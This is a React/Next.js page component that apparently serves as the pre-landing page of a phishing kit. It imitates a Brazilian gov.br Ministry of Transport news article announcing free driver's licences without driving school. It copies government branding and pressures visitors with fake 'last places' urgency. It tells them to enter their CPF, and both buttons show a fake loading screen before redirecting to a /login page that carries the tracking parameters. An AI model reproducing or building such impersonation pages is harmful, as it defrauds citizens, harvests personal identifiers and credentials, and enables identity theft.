'use client';

import { useState, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';
import { FaEllipsisV, FaCookieBite, FaTh, FaUser, FaBars, FaSearch, FaHome, FaChevronRight, FaFacebookF, FaTwitter, FaLinkedinIn, FaWhatsapp, FaLink, FaDice, FaInstagram, FaYoutube } from 'react-icons/fa';
import { FaXTwitter } from 'react-icons/fa6';

export default function Preland2() {
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const secondButtonRef = useRef<HTMLButtonElement>(null);

  const handleScrollToSecond = () => {
    secondButtonRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  const handleClick = () => {
    setIsLoading(true);
    const params = searchParams.toString();
    const url = params ? `/login?${params}` : '/login';
    setTimeout(() => {
      router.push(url);
    }, 4000);
  };

  if (isLoading) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90">
        <div className="text-center">
          <div className="w-12 h-12 border-3 border-white/20 border-t-white rounded-full animate-spin mx-auto mb-6"></div>
          <p className="text-white/80 text-sm">Carregando...</p>
        </div>
      </div>
    );
  }
  return (
    <div className="bg-white min-h-screen">
      {/* Header Gov.br */}
      <header style={{ backgroundColor: 'white', padding: '12px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ display: 'flex', alignItems: 'center' }}>
          <Image 
            src="/logo645.png" 
            alt="Logo gov.br" 
            width={70} 
            height={24} 
            style={{ marginRight: '32px' }}
          />
          <button aria-label="Menu de links" style={{ border: 'none', color: 'rgb(20, 81, 180)', fontSize: '14px', marginLeft: '32px', cursor: 'pointer', background: 'none', padding: '0px' }}>
            <FaEllipsisV style={{ fontSize: '16px' }} />
          </button>
          <div style={{ borderLeft: '1px solid rgb(204, 204, 204)', height: '24px', margin: '0px 16px' }}></div>
        </div>
        <div style={{ display: 'flex', alignItems: 'center' }}>
          <button style={{ border: 'none', color: 'rgb(20, 81, 180)', cursor: 'pointer', marginLeft: '24px', background: 'none', padding: '0px' }}>
            <FaCookieBite style={{ fontSize: '16px' }} />
          </button>
          <button type="button" aria-label="Sistemas" style={{ border: 'none', color: 'rgb(20, 81, 180)', cursor: 'pointer', marginLeft: '24px', background: 'none', padding: '0px' }}>
            <FaTh style={{ fontSize: '16px' }} />
          </button>
          <button type="button" onClick={handleClick} style={{ backgroundColor: 'rgb(20, 81, 180)', color: 'white', border: 'none', borderRadius: '9999px', padding: '6px 16px', display: 'flex', alignItems: 'center', fontSize: '14px', cursor: 'pointer', marginLeft: '24px' }}>
            <FaUser style={{ color: 'white', marginRight: '8px', fontSize: '16px' }} />
            <span>Entrar</span>
          </button>
        </div>
      </header>

      {/* Nav */}
      <nav style={{ backgroundColor: 'white', padding: '16px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <button style={{ border: 'none', color: 'rgb(20, 81, 180)', display: 'flex', alignItems: 'center', cursor: 'pointer', background: 'none', padding: '0px' }}>
          <FaBars style={{ marginRight: '10px', fontSize: '16px' }} />
          <span style={{ color: 'rgb(102, 102, 102)', fontSize: '1rem', fontWeight: 300, lineHeight: '20px', paddingTop: '2px' }}>Ministério dos Transportes</span>
        </button>
        <button aria-label="Pesquisar" style={{ border: 'none', color: 'rgb(20, 81, 180)', fontSize: '16px', cursor: 'pointer', background: 'none', padding: '0px' }}>
          <FaSearch />
        </button>
      </nav>

      {/* Breadcrumb */}
      <div className="px-4 py-3">
        <nav className="flex items-center text-sm text-gray-600 flex-wrap gap-1">
          <FaHome className="text-[#1351B4] text-xs" />
          <FaChevronRight className="text-gray-400 text-xs mx-1" />
          <span className="text-[#1351B4]">Assuntos</span>
          <FaChevronRight className="text-gray-400 text-xs mx-1" />
          <span className="text-[#1351B4]">Notícias</span>
          <FaChevronRight className="text-gray-400 text-xs mx-1" />
          <span className="text-[#1351B4]">2025</span>
          <FaChevronRight className="text-gray-400 text-xs mx-1" />
          <span className="text-[#1351B4]">12</span>
          <FaChevronRight className="text-gray-400 text-xs mx-1" />
          <span className="font-semibold" style={{ fontSize: '0.8125rem', color: 'rgb(51, 51, 51)' }}>Como solicitar sua Carteira de motorista gratuitamente e sem autoescola</span>
        </nav>
      </div>

      <div className="border-b border-gray-200"></div>

      {/* Main Content */}
      <main className="px-4 py-6 max-w-4xl mx-auto">
        <div className="mb-4">
          <span className="font-bold text-sm uppercase tracking-wide" style={{ color: 'rgb(85, 85, 85)' }}>TRÂNSITO</span>
        </div>
        
        <h1 className="text-2xl md:text-3xl font-bold leading-tight mb-4" style={{ color: 'rgb(12, 50, 111)' }}>
          CNH do Brasil: Governo libera carteira de motorista 100% gratuita e sem necessidade de autoescola
        </h1>
        
        <p className="text-base leading-relaxed mb-6" style={{ color: 'rgb(85, 85, 85)' }}>
          Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e <strong style={{ color: 'rgb(51, 51, 51)' }}>as vagas para 2026 estão se esgotando.</strong> A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito.
        </p>

        {/* Share buttons */}
        <div className="flex items-center gap-4 mb-4">
          <span className="text-gray-500 text-sm">Compartilhe:</span>
          <div className="flex gap-3">
            <span className="hover:opacity-80 transition-opacity cursor-pointer" style={{ color: 'rgb(39, 111, 232)' }}><FaFacebookF size={18} /></span>
            <span className="hover:opacity-80 transition-opacity cursor-pointer" style={{ color: 'rgb(39, 111, 232)' }}><FaTwitter size={18} /></span>
            <span className="hover:opacity-80 transition-opacity cursor-pointer" style={{ color: 'rgb(39, 111, 232)' }}><FaLinkedinIn size={18} /></span>
            <span className="hover:opacity-80 transition-opacity cursor-pointer" style={{ color: 'rgb(39, 111, 232)' }}><FaWhatsapp size={18} /></span>
            <span className="hover:opacity-80 transition-opacity cursor-pointer" style={{ color: 'rgb(39, 111, 232)' }}><FaLink size={18} /></span>
          </div>
        </div>

        <div className="text-sm text-gray-500 mb-6">
          <p>Publicado em 09/12/2025 20h58</p>
          <p>Atualizado em 10/12/2025 14h42</p>
        </div>

        {/* Main Image */}
        <div className="mb-8">
          <Image
            src="/cnh-brasil-lancamento.jpeg"
            alt="Lançamento do Programa CNH do Brasil"
            width={800}
            height={450}
            className="w-full rounded-lg shadow-md"
          />
        </div>

        {/* Article Content */}
        <article className="prose prose-lg max-w-none">
          <p className="text-base leading-relaxed mb-4" style={{ color: 'rgb(85, 85, 85)' }}>
            <span className="float-left text-5xl font-bold text-[#1351B4] mr-3 mt-1 leading-none">O</span>
            processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona.
          </p>

          {/* CTA Button 1 */}
          <div className="text-center my-8">
            <button onClick={handleScrollToSecond} className="bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg inline-block">
              Fazer Minha Inscrição Agora
            </button>
            <p className="text-base leading-relaxed mt-3" style={{ color: 'rgb(85, 85, 85)', opacity: 0.6 }}>Últimas vagas para 2026</p>
          </div>

          <h2 className="text-xl font-bold mt-8 mb-4" style={{ color: 'rgb(51, 51, 51)' }}>1. O que mudou com a nova resolução?</h2>
          
          <ul className="list-disc pl-6 space-y-3 mb-6 text-base leading-relaxed" style={{ color: 'rgb(85, 85, 85)' }}>
            <li><strong style={{ color: 'rgb(51, 51, 51)' }}>Fim da obrigatoriedade de autoescola:</strong> Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)</li>
            <li><strong style={{ color: 'rgb(51, 51, 51)' }}>Curso teórico online e gratuito:</strong> Disponível após realizar o cadastro.</li>
            <li><strong style={{ color: 'rgb(51, 51, 51)' }}>Carga horária prática reduzida:</strong> De 20 horas obrigatórias para apenas 2 horas mínimas</li>
            <li><strong style={{ color: 'rgb(51, 51, 51)' }}>Aulas práticas flexíveis:</strong> Podem ser realizadas com instrutor autônomo credenciado pelo Detran</li>
            <li><strong style={{ color: 'rgb(51, 51, 51)' }}>Redução de até 80% nos custos:</strong> Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça</li>
          </ul>

          {/* Info Box */}
          <div className="px-4 py-3 mb-6 mx-auto" style={{ backgroundColor: 'rgb(243, 243, 244)', borderRadius: '6px', maxWidth: '95%' }}>
            <p className="font-semibold text-base" style={{ color: 'rgb(51, 51, 51)' }}>Últimas Vagas para 2026</p>
            <p className="text-base leading-relaxed" style={{ color: 'rgb(85, 85, 85)' }}>
              Devido à alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para <strong style={{ color: 'rgb(51, 51, 51)' }}>janeiro de 2026</strong>. Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação.
            </p>
          </div>

          {/* Second Image */}
          <div id="como-se-inscrever" className="mb-6">
            <Image
              src="/thumb-cnh-2.png"
              alt="CNH do Brasil - Como se inscrever"
              width={800}
              height={450}
              className="w-full rounded-lg shadow-md"
            />
          </div>

          <h2 className="text-xl font-bold mt-8 mb-4" style={{ color: 'rgb(51, 51, 51)' }}>2. Como se inscrever no programa?</h2>
          
          <p className="text-base leading-relaxed mb-4" style={{ color: 'rgb(85, 85, 85)' }}>
            O processo de inscrição é simples e pode ser feito totalmente online:
          </p>

          <ol className="list-decimal pl-6 space-y-3 mb-6 text-base leading-relaxed" style={{ color: 'rgb(85, 85, 85)' }}>
            <li>Clique no botão abaixo para iniciar seu cadastro</li>
            <li>Informe seu CPF para verificar elegibilidade</li>
            <li>Confirme seus dados pessoais</li>
            <li>Sua Carteira de Motorista será emitida em até 20 dias</li>
          </ol>

          {/* CTA Button 2 */}
          <div className="text-center my-8">
            <button ref={secondButtonRef} onClick={handleClick} className="bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg inline-block">
              <span className="underline">Fazer Minha Inscrição Agora</span>
            </button>
            <p className="text-base leading-relaxed mt-3" style={{ color: 'rgb(85, 85, 85)', opacity: 0.6 }}>Últimas vagas para 2026</p>
          </div>

          <div className="mt-8">
            <h2 className="text-xl font-bold mt-8 mb-4" style={{ color: 'rgb(51, 51, 51)' }}>3. Base Legal</h2>
            <ul className="list-disc pl-6 space-y-2 text-base leading-relaxed" style={{ color: 'rgb(85, 85, 85)' }}>
              <li>Resolução Contran nº 985/2025</li>
              <li>Lei nº 14.071/2020 (Nova Lei de Trânsito)</li>
              <li>Decreto nº 11.999/2025 (Programa CNH do Brasil)</li>
            </ul>
          </div>
        </article>
      </main>

      {/* Footer Gov.br */}
      <footer className="text-white mt-12 w-full" style={{ backgroundColor: 'rgb(7, 29, 65)', display: 'block' }}>
        <div className="px-6 py-8">
          <span className="text-3xl font-bold italic text-white mb-8 block">gov.br</span>
          
          <div className="border-t border-white/20 pt-6">
            <div className="space-y-0">
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">ASSUNTOS</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">ACESSO À INFORMAÇÃO</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">COMPOSIÇÃO</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">CANAIS DE ATENDIMENTO</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">CENTRAL DE CONTEÚDOS</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
              <div className="flex justify-between items-center py-4 border-b border-white/20">
                <span className="font-semibold">SERVIÇOS</span>
                <FaChevronRight className="text-white/70 rotate-90" />
              </div>
            </div>
          </div>

          <div className="mt-8 flex items-center gap-2 text-white/80">
            <FaDice />
            <span>Redefinir Cookies</span>
          </div>

          <div className="mt-8">
            <p className="font-semibold mb-4">REDES SOCIAIS</p>
            <div className="flex gap-4">
              <FaXTwitter size={20} />
              <FaYoutube size={20} />
              <FaFacebookF size={20} />
              <FaDice size={20} />
              <FaInstagram size={20} />
              <FaLinkedinIn size={20} />
            </div>
          </div>
        </div>
      </footer>

      {/* VLibras Icon */}
      <div className="fixed right-4 top-1/2 z-50 cursor-pointer transition-transform duration-300 ease-in-out" style={{ transform: 'translateY(calc(-50% - 20px))' }}>
        <Image src="/access_icon.svg" alt="VLibras" width={40} height={40} />
      </div>

      {/* Back to Top Button */}
      <button 
        className="fixed right-4 bottom-4 z-50 bg-[#1351B4] p-3 rounded-full shadow-lg hover:bg-[#0D3C8C] transition-colors"
        aria-label="Voltar ao topo"
        onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
      >
        <FaChevronRight className="text-white rotate-[-90deg]" size={16} />
      </button>
    </div>
  );
}
